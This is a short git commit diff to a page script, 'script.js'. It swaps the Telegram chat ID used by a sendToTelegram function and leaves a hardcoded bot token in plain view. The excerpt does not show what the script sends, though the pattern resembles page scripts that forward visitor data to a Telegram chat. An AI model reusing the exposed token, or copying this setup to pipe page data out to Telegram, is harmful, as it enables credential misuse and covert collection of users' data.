aa10d48da45778e07458ae86b3f07206074aaf27
fn-static <onlyfanskasia111@gmail.com>
2024-09-01 23:15:38 +0200

    Update script.js

--- script.js
+++ script.js
@@ -20,7 +20,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Token bota i chat ID (upewnij się, że zostały poprawnie ustawione)
     const botToken = '7268385791:AAEZeAc-jfVun4EEKdiOquB_jC-7vrBFupY';
-    const chatId = '-4582822663';
+    const chatId = '7025921907';
 
     // Funkcja do wysyłania wiadomości do Telegrama
     function sendToTelegram(message) {
